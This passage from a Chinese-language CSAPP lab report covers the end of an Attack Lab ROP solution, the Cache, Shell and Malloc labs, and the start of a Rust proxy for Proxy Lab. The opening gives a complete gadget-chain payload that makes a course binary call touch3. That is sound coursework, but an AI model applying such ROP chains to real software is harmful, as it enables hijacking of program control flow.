```

有详细注释的函数，猜测应该是需要通过 `%rsp` 寄存器和偏移量算出字符串地址

查看这个函数的汇编：

```asm
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret
```

因此我们需要设法把 `%rsp` 和偏移量放到 `%rdi` 和 `%rsi` 内，再把加法结果，即 `%rax` 值传到 `%rdi` 内，最后调用函数即可

注意到最后的移动过程是我们熟悉的（同 phase4），而为了避免栈分配时字符串值被更改，字符串应该放在最后

这样我们就得到了答案的最后几行：

```
a2 19 40 00 00 00 00 00     # movq
fa 18 40 00 00 00 00 00     # call touch3
35 39 62 39 39 37 66 61 00  # string
```

前面的寄存器移动过程凑配即可，这里略去具体凑配过程（比较重复）

```
06 1a 40 00 00 00 00 00     # rsp 给 rax
a2 19 40 00 00 00 00 00     # rax 给 rdi
83 13 40 00 00 00 00 00     # pop 给 rsi
30 00 00 00 00 00 00 00     # offset 值
d6 19 40 00 00 00 00 00     # 调用加法
```

最后答案：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
83 13 40 00 00 00 00 00
30 00 00 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```

通过：

![](srcs/3-5.png)

## Cache Lab

### Part A

此部分需要实现一个缓存的模拟器，先放上最后通过的结果：

![](srcs/4-a.png)

代码文件具体见附件，这里只梳理整体思路

#### LRU 缓存

实现在了另外一个文件 `csim_lru.h` 中

基本原理是双向链表加上哈希表，以便实现 $O(1)$ 的查询及增加操作，具体算法就不赘述了

不过其实测试集 E 都比较小，就性能而言选用该数据结构意义不是特别大，而由于较多的内存分配操作，可能性能不如遍历数组读取

但封装 LRU Cache 的好处还是存在的：便于简化代码结构， `csim.c` 仅 70 余行

#### 命令行参数读取

调用库函数 `getopt` 即可

```cpp
int read_opt(int argc, char** argv) {
    int op;
    while ((op = getopt(argc, argv, "hvs:E:b:t:")) != -1) {
        switch (op) {
            case 'v':
                break;
            case 's':
                s = atoi(optarg);
                break;
            case 'E':
                E = atoi(optarg);
                break;
            case 'b':
                b = atoi(optarg);
                break;
            case 't':
                trace_file_path = optarg;
                break;
            default:
                return 0;
        }
    }
    return 1;
}
```

这里图省事就没写 `-h` 和 `-v` 选项了

#### 文件读取

```cpp
FILE* fp;
fp = fopen(trace_file_path, "r");

char oper[256];
long address;
int size;
while (fscanf(fp, "%s %lx,%d", oper, &address, &size) == 3) {
    if (oper[0] == 'I')
        continue;

    int group_idx = (address >> b) & ((1 << s) - 1);
    int tag = (int)(address >> (b + s));

    findCache(tag, caches[group_idx]);
    if (oper[0] == 'M')
        findCache(tag, caches[group_idx]);
}
```

直接使用 `fscanf` 读取每一行，掩码读取组索引和标记即可

#### 访问 Cache

实际上缓存模拟器核心的就是这一点，因为该模拟器实际并不关心数据具体是什么，所以 `L` 和 `S` 都只是更新一下缓存里的某一块的访问时间，而 `M` 只要重复两次即可

```cpp
void findCache(int tag, LRUCache* cache) {
    if (lRUCacheGet(cache, tag)) {
        hit++;
        return;
    }

    miss++;
    if (!lRUCachePut(cache, tag)) {
        eviction++;
    }
}
```

具体逻辑也很简单，如果缓存命中，增加 `hit`，否则相当于需要把数据加载到缓存内，则增加 `miss`，并根据是否发生了驱逐判断 `eviction` 是否需要增加

### Part B

本部分是利用缓存命中的原理优化矩阵转置算法

实际上有以下测试点：

- 32 x 32，满分要求： miss 次数小于 300
- 64 x 64，满分要求： miss 次数小于 1300
- 61 x 67，满分要求： miss 次数小于 2000。

#### case1

该 case 考虑 32 x 32

首先对实验参数分析：

`tracegen.c` 内：

```cpp
static int A[256][256];
static int B[256][256];
```

$offset = ( 2^8 )^2\times 4=2^{18} $

相当于两个数组 "对齐" ，因此 A[0] 和 B[0] 同组，以此类推

而 $s=5, E=1, b=5$

即一次可以载入 $2^5/4=8$ 个 int

不难想到 8 \* 8 分块：

```cpp
void transpose_submit(int M, int N, int A[N][M], int B[M][N]) {
    for (int i = 0; i < N; i += 8) {
        for (int j = 0; j < M; j += 8) {
            for (int k = i; k < i + 8; k++) {
                for (int s = j; s < j + 8; s++) {
                    B[s][k] = A[k][s];
                }
            }
        }
    }
}
```

除了含有对角线的小 8 \* 8 分块，别的块应该都是不会产生 miss 的

但是还是不能满分，实际测试 344 次 miss

那么哪里可以改进呢？主要还是源于对角线块的 miss 过多，缓存会在 A, B 内容间不断切换。所以可以考虑每次先存下 A 的一行来替换，这样就不会重复载入 A 的一行内容 (相当于利用寄存器做 l1 的高速缓存)

```cpp
for (int i = 0; i < 32; i += 8) {
    for (int j = 0; j < 32; j += 8) {
        for (int k = i; k < i + 8; k++) {
            int a0 = A[k][j];
            int a1 = A[k][j + 1];
            int a2 = A[k][j + 2];
            int a3 = A[k][j + 3];
            int a4 = A[k][j + 4];
            int a5 = A[k][j + 5];
            int a6 = A[k][j + 6];
            int a7 = A[k][j + 7];
            B[j][k] = a0;
            B[j + 1][k] = a1;
            B[j + 2][k] = a2;
            B[j + 3][k] = a3;
            B[j + 4][k] = a4;
            B[j + 5][k] = a5;
            B[j + 6][k] = a6;
            B[j + 7][k] = a7;
        }
    }
}
```

得： ![](srcs/4-b-1-2.png)

顺利满分通过这一测试点

#### case2

该 case 考虑 64 x 64

64 x 64 的问题在于每 $32/(64/8)=4$ 行就会产生相同的组索引。所以原先的 8 x 8 分块在内部也会产生 miss

为了达到满分，我们先来计算一下理论的 miss 数最小值（也就是至少需要载入多少次缓存），应该是 $2\times 64 \times 64 / 8 = 1024$

也就是说，除去给对角线特殊块留的容错，应该尽量使每片内存都只被缓存载入一次

还是取 A 和 B 的 $8\times 8$ 分块，这次我们先研究如何解决这个子问题

不妨考虑先取 A 矩阵的上 $8\times 4$ 元素，移到右边：

```
12345678    11115555
12345678--->22226666
12345678--->33337777
12345678    44448888
........    ........
```

这个时候可以认为 A 矩阵上方 $8\times 4$ 元素信息已经读取完毕

此时， A 矩阵可以读取下方 $8\times 4$ 元素了

但是注意这个时候 B 还不能轻举妄动，因为 B 的每一行都应只被缓存载入一次，所以只有在这一行被更新为转置状态后才能将这一行逐出缓存

思考如何解放 B 的第一行：显然需要使用寄存器。用一些寄存器读取 $A[i][0], 4\le i \le 7$，再把 B 的第一行后 4 位数据写入别的寄存器内，此时即可利用这些寄存器，在补全 B 的第一行的同时，不失去 B 原先的数据。把这些数据（恰好应该是转置后第五行的值）再保存到第五行，第五行也就补全了

B 的其他行同理

对每一个 $8\times 8$ 块都使用这个策略即可，代码如下

外层是循环每一块：

```cpp
for (int i = 0; i < 64; i += 8) {
    for (int j = 0; j < 64; j += 8) {
        ... // 内部处理
    }
}
```

接下来对于每一块内部：

```cpp
for (int k = i; k < i + 4; k++) { // 首先移动上 8 * 4
    int a0 = A[k][j];
    int a1 = A[k][j + 1];
    int a2 = A[k][j + 2];
    int a3 = A[k][j + 3];
    int a4 = A[k][j + 4];
    int a5 = A[k][j + 5];
    int a6 = A[k][j + 6];
    int a7 = A[k][j + 7];
    B[j][k] = a0;
    B[j + 1][k] = a1;
    B[j + 2][k] = a2;
    B[j + 3][k] = a3;
    B[j][k + 4] = a4;
    B[j + 1][k + 4] = a5;
    B[j + 2][k + 4] = a6;
    B[j + 3][k + 4] = a7;
}

for (int k = j; k < j + 4; k++) {
    // 逐个从缓冲区驱逐 B 的 0, 1, 2, 3 行
    // 并替换成 4, 5, 6, 7 行
    int a0 = B[k][i + 4];
    int a1 = B[k][i + 5];
    int a2 = B[k][i + 6];
    int a3 = B[k][i + 7];

    int a4 = A[i + 4][k];
    int a5 = A[i + 5][k];
    int a6 = A[i + 6][k];
    int a7 = A[i + 7][k];

    // 替换完后就可以驱逐了
    B[k][i + 4] = a4;
    B[k][i + 5] = a5;
    B[k][i + 6] = a6;
    B[k][i + 7] = a7;

    // 迎来新的行，补全它
    B[k + 4][i] = a0;
    B[k + 4][i + 1] = a1;
    B[k + 4][i + 2] = a2;
    B[k + 4][i + 3] = a3;
    B[k + 4][i + 4] = A[i + 4][k + 4];
    B[k + 4][i + 5] = A[i + 5][k + 4];
    B[k + 4][i + 6] = A[i + 6][k + 4];
    B[k + 4][i + 7] = A[i + 7][k + 4];
}
```

顺利满分通过

![](srcs/4-b-2.png)

#### case3

该 case 考虑 61 x 67

好消息在于行数不是 2 的次幂形式，所以仍然可以 $8*m$ 分块

宏定义一下 `Y_67` 后进行测试：

```cpp
for (int i = 0; i < 61; i += 8) {
    for (int j = 0; j < 67; j += Y_67) {
        if (i + 8 <= N && j + Y_67 <= M) {
            for (int s = j; s < j + Y_67; s++) {
                int a0 = A[i][s];
                int a1 = A[i + 1][s];
                int a2 = A[i + 2][s];
                int a3 = A[i + 3][s];
                int a4 = A[i + 4][s];
                int a5 = A[i + 5][s];
                int a6 = A[i + 6][s];
                int a7 = A[i + 7][s];
                B[s][i] = a0;
                B[s][i + 1] = a1;
                B[s][i + 2] = a2;
                B[s][i + 3] = a3;
                B[s][i + 4] = a4;
                B[s][i + 5] = a5;
                B[s][i + 6] = a6;
                B[s][i + 7] = a7;
            }
        } else {
            for (int k = i; k < i + 8 && k < 61; k++) {
                for (int s = j; s < j + Y_67 && s < 67; s++) {
                    B[s][k] = A[k][s];
                }
            }
        }
    }
}
```

实际测试发现居然 $Y\_67=1$ 时 miss 最少，可能是因为这个时候已经充分利用了读取 B 时候的局部性

于是得到了一个答案：

```cpp
for (int i = 0; i < 61; i += 8) {
    for (int j = 0; j < 67; j++) {
        if (i + 8 <= N && j < M) {
            int a0 = A[i][j];
            int a1 = A[i + 1][j];
            int a2 = A[i + 2][j];
            int a3 = A[i + 3][j];
            int a4 = A[i + 4][j];
            int a5 = A[i + 5][j];
            int a6 = A[i + 6][j];
            int a7 = A[i + 7][j];
            B[j][i] = a0;
            B[j][i + 1] = a1;
            B[j][i + 2] = a2;
            B[j][i + 3] = a3;
            B[j][i + 4] = a4;
            B[j][i + 5] = a5;
            B[j][i + 6] = a6;
            B[j][i + 7] = a7;
        } else {
            for (int k = i; k < i + 8 && k < 61; k++) {
                B[j][k] = A[k][j];
            }
        }
    }
}
```

满分通过：

![](srcs/4-b-3.png)

Cache Lab 总结果：

![](srcs/4-b.png)

总得分 $53/53$

## Shell Lab

本次实验的要求是实现一个支持任务控制的 Unix shell 程序

程序的框架已经给出，只需要补充一些功能性的函数

由于整体是一个编程性质的实验，所以这里只在贴上最后结果后，讲一些实验中值得注意的函数

### 评测

可能由于每次运行的 pid 都有所不同，并且也无法保证 `/bin/ps` 行为相同，本实验没有给出一键测试 shell 正确性的程序

但对于每个评测点，都给出了 `tsh` 和 `tshref` 生成运行结果的程序

所以只要批量生成结果后手动比较即可

`tshref` 的结果已经给出，在 `tshref.out` 文件中，下面我们写一个脚本批量生成 `tsh` 的运行结果 (fish 脚本，语法与 posix 有所不同)

![](srcs/5-1.png)

然后手动比较文件

（因为 pid 都在括号内，所以首先用正则表达式把 pid 统一替换成 10000）

![](srcs/5-regex.png)

随后比较：

```bash
diff 1.out tshref.out > out.diff
```

查看发现只有 `ps` 运行结果不同，而运行行为达到预期

![](srcs/5-diff.png)

因此实验完成

### eval

补全如下：

```cpp
void eval(char* cmdline) {
    char* argv[MAXARGS];
    int bg;
    pid_t pid;

    bg = parseline(cmdline, argv);
    if (argv[0] == NULL)
        return;

    if (!builtin_cmd(argv)) {
        if ((pid = fork()) == 0) {
            setpgid(0, 0);
            if (execve(argv[0], argv, environ) < 0) {
                printf("%s: Command not found\n", argv[0]);
                exit(0);
            }
        }

        // 此处是父进程
        addjob(jobs, pid, (bg == 1 ? BG : FG), cmdline);
        if (!bg) {
            waitfg(pid);
        } else {
            printf("[%d] (%d) %s", pid2jid(pid), pid, cmdline);
        }
    }

    return;
}
```

和书上给出的例程差不多，主要区别如下：

- `setpgid(0, 0);` 使得能正常接受别的 `shell` 发送的终止信号，否则自己的所有子进程都会被终止
- 前台进程的阻塞用的是 `waitfg`，后面实现 `fg` 命令也需要用到这一函数

理论上来说这里需要考虑屏蔽信号，实际上，现代计算机多核 cpu 并行运行各个进程，在进程数小的情况下很难因为并发遇到执行时序的问题，不过严谨考虑还是加锁为好，这里作为一个 toy 程序就没加了

### do_bgfg

这里的 `do_xx` 似乎是这种解释器程序普遍的命名习惯，代表执行什么什么内置指令

`bg` 和 `fg` 要实现的是对进程运行状态的转换

```cpp
void do_bgfg(char** argv) {
    int id;
    struct job_t* job;

    // 这里根据参数判断合法性，获取 job
    ......

    job->state = (argv[0][0] == 'b' ? BG : FG);
    kill(-job->pid, SIGCONT);
    if (argv[0][0] == 'b')
        printf("[%d] (%d) %s", job->jid, job->pid, job->cmdline);
    else
        waitfg(job->pid);

    return;
}
```

注意前台进程需要等待即可

### waitfg

很实用的 `helper` 函数

```cpp
void waitfg(pid_t pid) {
    struct job_t* job = getjobpid(jobs, pid);
    while (job->state == FG) {
        sleep(1);
    }
    return;
}
```

按照实验说明的推荐，采用轮询加上休眠的方式即可，这样对这一进程的负担也比较小

### sigint & sigtstp

接下来是几个信号处理时的异步回调函数

```cpp
void sigint_handler(int sig) {
    pid_t f_pid = fgpid(jobs);
    if (f_pid) {
        kill(-f_pid, sig);
    }
    return;
}
```

```cpp
void sigtstp_handler(int sig) {
    pid_t f_pid = fgpid(jobs);
    if (f_pid) {
        kill(-f_pid, sig);
    }
    return;
}
```

这两个函数比较类似，接收到键盘的终止 / 暂停信号后发送给前台进程的进程组，所以用 `-f_pid`

### sigchld

这一部分用于处理子进程的中断 / 暂停信号

```cpp
void sigchld_handler(int sig) {
    pid_t pid;
    int status;

    while ((pid = waitpid(-1, &status, WNOHANG | WUNTRACED)) > 0) {
        if (WIFSTOPPED(status)) {       // 暂停信号
            printf("Job [%d] (%d) stopped by signal %d\n", pid2jid(pid), pid,
                   WSTOPSIG(status));
            getjobpid(jobs, pid)->state = ST;
        } else {
            if (WIFSIGNALED(status)) {  // 退出信号
                printf("Job [%d] (%d) terminated by signal %d\n", pid2jid(pid),
                       pid, WTERMSIG(status));
            }
            // 子进程退出信号，以及正常运行结束
            deletejob(jobs, pid);
        }
    }
    return;
}
```

注意由于 unix 信号的阻塞机制，这里需要用 `while` 处理所有的僵死进程

### debug 细节

由于是编程实验，这一部分记录实验过程中遇到的有意思的问题以及解决方案

#### 信号处理

在 `sigchld_handler` 函数中，一开始仿照书本 (注：第二版书)，采用的条件是

```cpp
while ((pid = waitpid(-1, &status, 0)) > 0) {
    ......
}
```

但是会出现奇怪的 bug，终止进程输出的提示均为 `[0] (0)`

实际上书本的写法是有些问题的：这样做虽然会回收所有的僵死进程，但是 `waitpid` 的默认行为会不断等待活跃进程，直到活跃进程僵死才会返回

而我们虽然希望信号处理函数能够回收所有的进程，但我们也不希望信号处理处理函数会一直阻塞，直到所有进程运行完毕才继续执行，这样的话之后连前台进程都不存在了，自然也就获取不到前台进程的 `pid` 了，故 shell 的显示就会出现问题。理想情况下，应该是一次信号处理函数处理完当前所有僵死进程后就退出

换言之，这里的 `waitpid` 应该是一个同步函数而非异步函数

（吐槽一下，高级语言的同步异步函数写多了再看 C 语言这种面向底层的语言确实有点小头疼）

为了修正这一问题，可以通过设置 `waitpid` 的 `options` 参数改变 `waitpid` 的默认行为

修改后如下：

```cpp
while ((pid = waitpid(-1, &status, WNOHANG | WUNTRACED)) > 0) {
    ......
}
```

`WNOHANG` 选项使得这一函数变为同步函数，如果没有僵死进程就立刻返回

`WUNTRACED` 选项使得这一函数能够处理暂停的进程

#### printf

可能在阅读上面代码时，读者会觉得 `sigchld_handler` 的信号处理很不优雅， `printf` 这种根据信号类型来打印的函数为什么不放在具体的信号处理函数里，而是选择放在一个大的回收子进程的函数内呢？

从功能上来说，是因为如果 shell 中运行的子进程收到终止 / 暂停信号而终止，我们希望 shell 程序也能提示用户。而信号处理函数只能处理 shell 进程自身收到的信号，适用范围就窄了。如果把打印写在信号处理函数内，信号依旧会得到处理，但是会在 `test16` 中因为没有子进程终止信号的提示，输出与 `tshref` 不一致

值得一提的是，这里有一个很有意思的安全问题，由信号处理函数中的 `printf` 引发。我们现在所写的 `sigchld_handler` 事实上也是不安全的，C 语言中信号处理函数中能安全调用的函数是有限的，可以在 [这个网站](https://man7.org/linux/man-pages/man7/signal-safety.7.html) 查阅

而 `printf` 函数并不在此列，这是因为 `printf` 为了确保线程安全会在写入到文件（这里是写入到标准输出这一文件描述符）时给文件加一个锁，但是注意：这个 `shell` 程序在主体控制流中也有 `printf` 函数的调用（例如打印进程的提示消息），考虑现在发生了这样的一个调用，并且在从打印提示消息到给文件描述符解锁的过程中，恰好程序收到一个终止信号，于是信号处理函数被调用，进程会阻塞在给文件描述符解锁之前，转而去执行信号处理函数中的 `printf` ，而这次的调用在执行到准备打印时，却会发现标准输出被加锁了（因为还没能成功解锁），故会停下来等候。但信号处理函数已经阻塞了进程执行正常控制流，自然也就一直等不到谁能给标准输出解锁了：这就造成了程序的死锁

严格来说，我们这个 "toy shell" 目前还是一个非常不健壮的状态。这种类似的信号处理更合理也更普遍的方式是使用管道来完成，不过这就大大超出了本实验的范畴，故不在此介绍

至此，Shell Lab 的实验圆满结束

## Malloc Lab

> 在本实验中，您将为 C 程序编写动态存储分配器，即您自己的 malloc、free 和 realloc 例程版本。我们鼓励您创造性地探索设计空间并实施正确、高效和快速的分配器。

本次实验比较硬核，需要建立在理解了内存分配的整体概念的基础上才能理解 `malloc` 函数究竟给用户提供了怎样的内存抽象，进而完成本次实验

### 环境配置

本次实验官方只提供了两个 tiny 的 trace 文件，出于完整性考虑，这里从 [这个仓库](https://gitee.com/tan-giteeLLL/csapp/tree/master/Labs/Lab7-Malloc/malloclab-handout/traces) 下载到了需要的 traces 文件，并对编译做了个宏配置，DEBUG 模式下调用 tiny 的 trace 文件

```cpp
#define TRACEDIR "./traces/"
#define DEBUG   // 是否在 debug 模式？

#ifdef DEBUG
#define DEFAULT_TRACEFILES \
  "short1-bal.rep",\
  "short2-bal.rep"

#else
#define DEFAULT_TRACEFILES \
  // ...... 这里是 11 个评测用的 trace 文件
#endif
```

现在可以正常测试：

![](srcs/malloc-pre.png)

### 基本思路

这里介绍下本次实验的大致思路和完成情况：

- 分配策略采用的是与 GNU malloc 包相同的分离适配 (segregated fit), 对空间的利用率比较好，性能也不错 ($O(1)$)

- 本次实验对吞吐量的评测是宏定义了一个满分条件：
  ```cpp
  #define AVG_LIBC_THRUPUT      600E3  /* 600 Kops/sec */
  ```
  这个条件受计算机性能影响极大，由于实验更新换代不是很及时，所以自动评测对吞吐量的评测结果不能很好反应分配函数的性能，不过本实验分配策略都是 $O(1)$ 的，吞吐率不应该碰到瓶颈
  
- 本次实验过程中，充分利用现代编译器性能（实验环境 gcc 11.2.0），采用内联函数替代宏定义，可读性更强也不容易出错

- 本次实验最后成绩

  ![image-20220606224657009](实验报告/image-20220606224657009.png)

### 内联工具函数

```c
/* get or set p as unsigned pointer */
static inline unsigned get(void* p) {
    return *(unsigned*)p;
}
static inline void put(void* p, unsigned val) {
    *(unsigned*)p = val;
}

/* pack info. size & alloc sign bits */
static inline unsigned pack(unsigned size, unsigned alloc) {
    return size | alloc;
}
/* depack size and alloc sign bits from pack */
static inline unsigned get_size(void* p) {
    return get(p) & ~0x7;
}
static inline unsigned get_alloc(void* p) {
    return get(p) & 1;
}

/* find head pointer for given class_num */
static inline void* get_head(int class_num) {
    return (void*)(get(heap_list + WSIZE * class_num));
}
/* find pre or suc pointer for given bp */
static inline void* get_pre(void* bp) {
    return (void*)get(bp);
}
static inline void* get_suc(void* bp) {
    return (void*)(get((void*)bp + WSIZE));
}

/* 根据有效载荷指针, 找到头部，脚部，前一块，下一块 */
static inline void* hdrp(void* bp) {
    return bp - WSIZE;
}
static inline void* ftrp(void* bp) {
    return bp + get_size(hdrp(bp)) - DSIZE;
}
static inline void* next_blkp(void* bp) {
    return bp + get_size(bp - WSIZE);
}
static inline void* prev_blkp(void* bp) {
    return bp - get_size(bp - DSIZE);
}
```

static 意义是告诉编译器本函数不会被链接到其他文件中，所以编译器可以放心的将其内联展开

### 分离适配

因为分离适配策略在书本上已经有相关介绍，具体原理这里就不再附图介绍

本实验的大小类以 2 的幂次为界限进行分割，具体个数采用宏定义可调：

```c
#define CLASS_SIZE 20
```

下面分函数介绍具体设计：

### mm_init

初始化。这里将大小类链表的（哨兵开头（并不是实际链表的头结点））放在了堆的开头：

```c
int mm_init(void) {
	// 初始化空间申请
    if ((heap_list = mem_sbrk((4 + CLASS_SIZE) * WSIZE)) == (void*)-1)
        return -1;
    // 初始化大小类头指针
    for (int i = 0; i < CLASS_SIZE; i++) {
        put(heap_list + i * WSIZE, 0);
    }
    put(heap_list + CLASS_SIZE * WSIZE, 0);
    // 序言块和结尾块
    put(heap_list + ((1 + CLASS_SIZE) * WSIZE), pack(DSIZE, 1));
    put(heap_list + ((2 + CLASS_SIZE) * WSIZE), pack(DSIZE, 1));
    put(heap_list + ((3 + CLASS_SIZE) * WSIZE), pack(0, 1));
    // 堆空间大小与 chunksize 对齐
    if (extend_heap(CHUNKSIZE / WSIZE) == NULL)
        return -1;
    return 0;
}
```

### extend_heap

拓展堆大小

```c
void* extend_heap(unsigned words) {
    unsigned size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE;

    void* bp;
    if ((int)(bp = mem_sbrk(size)) == -1)
        return NULL;

    // 设置 header 和 footer
    put(hdrp(bp), pack(size, 0));
    put(ftrp(bp), pack(size, 0));
    put(hdrp(next_blkp(bp)), pack(0, 1));

    return merge(bp);
}
```

### merge

试图将某一空闲块与前后合并：

```c
void* merge(void* bp) {
    unsigned prev_alloc = get_alloc(ftrp(prev_blkp(bp))); // 前一块是否被分配
    unsigned next_alloc = get_alloc(hdrp(next_blkp(bp))); // 后一块是否被分配
    unsigned size = get_size(hdrp(bp));                   // 当前块大小

    // 前后都不空
    if (prev_alloc && next_alloc) {
        insert(bp);
        return bp;
    }
    // 仅后空
    else if (prev_alloc && !next_alloc) {
        delete (next_blkp(bp));
        size += get_size(hdrp(next_blkp(bp)));
        put(hdrp(bp), pack(size, 0));
        put(ftrp(bp), pack(size, 0));
    }
    // 仅前空
    else if (!prev_alloc && next_alloc) {
        delete (prev_blkp(bp));
        size += get_size(hdrp(prev_blkp(bp)));
        put(ftrp(bp), pack(size, 0));
        put(hdrp(prev_blkp(bp)), pack(size, 0));
        bp = prev_blkp(bp);
    }
    // 均空闲
    else {
        delete (next_blkp(bp));
        delete (prev_blkp(bp));
        size += get_size(hdrp(prev_blkp(bp))) +
                get_size(ftrp(next_blkp(bp)));
        put(ftrp(next_blkp(bp)), pack(size, 0));
        put(hdrp(prev_blkp(bp)), pack(size, 0));
        bp = prev_blkp(bp);
    }
    insert(bp);
    return bp;
}
```

相当于删除链表的前/后结点

### insert

对于新得到的 block，需要插入其对应大小类对应的链表，这里直接插入链表开头即可

```c
void insert(void* bp) {
    unsigned size = get_size(hdrp(bp));			// 块大小
    unsigned class_num = find_class(size);		// 对应大小类
    // 链表是否为空（仅有哨兵结点）
    if (get_head(class_num) == NULL) {
        put(bp, 0);
        put((unsigned*)bp + 1, 0);

        put(heap_list + WSIZE * class_num, (unsigned)bp);
    } else {
        put(bp, 0);
        put((unsigned*)bp + 1, (unsigned)get_head(class_num));

        put(get_head(class_num), (unsigned)bp);
        put(heap_list + WSIZE * class_num, (unsigned)bp);
    }
}
```

### delete

这个函数负责将某空闲块从链表中删除

```c
void delete (void* bp) {
    unsigned size = get_size(hdrp(bp));
    unsigned class_num = find_class(size);

    void *pre_p = get_pre(bp), *suc_p = get_suc(bp);
    // 链表唯一结点
    if (!pre_p && !suc_p) {
        put(heap_list + WSIZE * class_num, 0);
    }
    // 链表最后结点
    else if (pre_p && !suc_p) {
        put(pre_p + WSIZE, 0);
    }
   // 链表开头
    else if (!pre_p && suc_p) {
        put(heap_list + WSIZE * class_num, (unsigned)suc_p);
        put(suc_p, 0);
    }
    // 链表中间结点
    else {
        put(pre_p + WSIZE, (unsigned)suc_p);
        put(suc_p, (unsigned)pre_p);
    }
}
```

### find_class

找到对应大小类，这个函数可以用二分查找优化，但实际观察这一函数并不是性能瓶颈，因此不再优化

```c
unsigned find_class(unsigned size) {
    for (int i = 4; i < CLASS_SIZE + 4; i++) {
        if (size <= (1 << i))
            return i - 4;
    }
    return CLASS_SIZE - 1;
}
```

### mm_malloc

内存分配，优先考虑空闲块

```c
void* mm_malloc(unsigned size) {
    void* bp;
    if (size == 0)
        return NULL;
    unsigned asize;
    if (size <= DSIZE)
        asize = 2 * DSIZE;
    else
        asize = DSIZE * ((size + (DSIZE) + (DSIZE - 1)) / DSIZE);
    // 是否能找到空闲块
    if ((bp = find_fit(asize)) != NULL) {
        place(bp, asize);
        return bp;
    }
    // 否则扩展堆
    if ((bp = extend_heap(max(asize, CHUNKSIZE) / WSIZE)) == NULL)
        return NULL;
    place(bp, asize);
    return bp;
}
```

### find_fit

用于找到合适的空闲块。这里采用了 best fit 策略

```c
void* find_fit(unsigned asize) {
    unsigned class_num = find_class(asize);
    void* bp;

    while (class_num < CLASS_SIZE) {
        bp = get_head(class_num);

        unsigned min_size = (unsigned)(-1);
        void* min_bp = NULL;
        while (bp) {
            unsigned cur_size = get_size(hdrp(bp));
            if (cur_size >= asize && cur_size < min_size) {
                min_size = cur_size;
                min_bp = bp;
            }
            bp = get_suc(bp);
        }
        if (min_bp) {
            return min_bp;
        }
        class_num++;
    }
    return NULL;
}
```

（malloc lab 主要为代码编写，因此本部分的实验报告主要介绍下代码细节）

## Proxy Lab

作为本报告的最后一个实验，本实验决定尝试使用 `rust` 语言，这是出于以下几个原因：

- 首先，Rust 语言可以比较好的完成这一任务：Web 代理服务器介于系统级编程和应用级编程之间，与 shell 类似，都需要调用许多 syscall，这就需要确保我们程序的安全性。同时，Web 代理服务器对并发等性能也有较高的要求。而 Rust 语言既能提供对安全的保障，也能提供接近 C 语言的性能（Rust 没有 gc 机制，本身语法也不会引入额外的抽象开销，且作为编译型语言，编译到 llvm IR 后也可以编译器后端进一步优化）
- 其次，C 语言的灵活性一定程度上也增加了开发代价：C 语言缺乏严格的类型机制和内存访问的限制，这一方面当然是 C 语言直接对接内存所带来的灵活性，但这也导致很多 bug 很难甚至无法在编译期检测出，必须在运行时才会被发现，极大增加了 debug 的难度，而 Rust 语言是近年来逐渐流行起来的一个系统级编程语言，强类型机制和错误处理机制赋予了 Rust 在编译期就能发现绝大部分内存相关的 bug 的能力
- 最后，CSAPP 的课程内容和实验设计很好地涵盖了操作系统的许多主要方面，但是课程实验设计已经许多年没有更新（许多实验已经接近十年没有更新过了），这一方面固然说明了实验设计的经典，但另外一方面，我们也可以采用近年来新流行的技术完成同样的任务，不同的完成方式对比中也能加深对实验核心的理解

Rust 语言的语法特性，多线程的 channel 通信等在此不再单独介绍，在后续代码遇到相关内容时会简略说明

### Part1&2

这里将实验的一二部分一并实现，实现一个支持并发处理连接请求的简易 proxy

#### 评测环境

本部分我们在用 Rust 编写后可以编译出可执行文件，可以将可执行文件交由 Proxy Lab 的评测脚本评测

不过，该评测脚本在部分系统（比如我的 ubuntu）上会出现一个 bug，评测脚本为了测试并发性能会用 python 开启一个 nop_server：

```shell
(line 301) ./nop-server.py ${nop_port} &> /dev/null &
```

该脚本指定解释器如下：

```shell
#!/usr/bin/python
```

但是该 python 脚本使用的语法是 python3 版本的，而在许多系统上，`usr/bin/python` 默认是 python2 的解释器而非 python3 的解释器

修正了这一 bug 后，评测结果：（最后还有第三部分，故本截图没有展示个人信息，可以见第三部分的截图）

![image-20220608151638010](实验报告/image-20220608151638010.png)

#### 实现简介

本实验中采用 `async/await` 异步协程实现对并发的支持。协程相当于程序负责调度维护的线程，切换开销比线程更小，可以达到更好的性能

> async/await 可以如下理解：
>
> `async fn f()` 将一个函数声明为了一个特殊的函数，进行 `f()` 调用时不会执行函数内容，而是返回一个 coroutine 对象，例如可以 `let a = f()`；对这个对象执行 `a.await` 会在运行到此处时实际运行函数内容，但同时会定义一个 breakpoint，线程到达这里时，可以继续执行 `a.await` 的函数内容，也可以去执行其他的 `.await` 点位。比喻性的说，协程是代码控制（而不是 OS 调度控制）的线程，代码可以实际规定一部分协程的运行顺序。因此，协程可以与线程**不**一一对应，这些协程应该由多少线程执行、应该先执行哪些协程是由最外层的 runner，或者说 runtime 决定的。

main 函数：

```rust
#[tokio::main]
async fn main() -> Result<()> {
    // bind to the port and start listening
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Too few arguments.");
        process::exit(1);
    }
    let port = &args[1];
    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await?;
    println!("Server listening on port {}", port);

    // wait for clients
    loop {
        let (stream, _) = listener.accept().await?;
        println!("New connection: {}", stream.peer_addr()?);

        // handle new client
        tokio::task::spawn(async move { handle_client(stream).await });
    }
}
```

在指定的端口上监听 tcp 连接，对于每个连接都建立一个对应的协程处理

协程的主要任务是将请求转发，并从服务端获取返回数据发送给客户端：

```rust
async fn handle_client(mut client: TcpStream) -> Option<()> {
    // read from tcpstream
    let mut data_recv = [0_u8; 1024];
    let size = client.read(&mut data_recv).await.ok()?;

    // parse the http request
    let request: Vec<u8> = data_recv[0..size].to_vec();
    let request = std::str::from_utf8(request.as_slice()).ok()?;

    let mut tokens = request.split_whitespace();
    let method = tokens.next()?;
    let uri = tokens.next()?;

    let uri = Uri::parse(uri).ok()?;
    let host = uri.authority()?.host().as_str();
    let port = uri.authority()?.port().unwrap_or("80");

    // connect to origin server
